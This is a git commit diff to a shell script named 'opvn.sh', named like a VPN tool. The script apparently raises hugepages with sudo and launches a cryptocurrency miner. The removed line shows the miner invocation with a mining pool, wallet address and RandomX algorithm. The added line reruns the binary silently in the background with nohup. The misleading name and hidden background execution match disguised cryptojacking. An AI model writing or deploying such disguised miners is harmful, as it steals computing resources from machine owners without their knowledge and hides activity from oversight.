2c7a1d70203cb6110c9c73846460842fbc728df8
bondbenz1821 <126075464+bondbenz1821@users.noreply.github.com>
2023-11-23 12:03:53 +0700

    Update opvn.sh

--- opvn.sh
+++ opvn.sh
@@ -1,2 +1,2 @@
 (grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) \
-&& ./opvn -o zephyr.miningocean.org:5332 -u ZEPHYR2K1mqDZDb61AD8TWAcj3Jf4tJwCNfGSLSN4vuoK36nRAHJeReEf9PeqxMVPEb2bsB3djNuDQuctoSAXAjcj1mtNbm9gqn45 -p test -a rx/0 -k --donate-level 1
+&& nohup sh opvn > result.log 2>&1 &
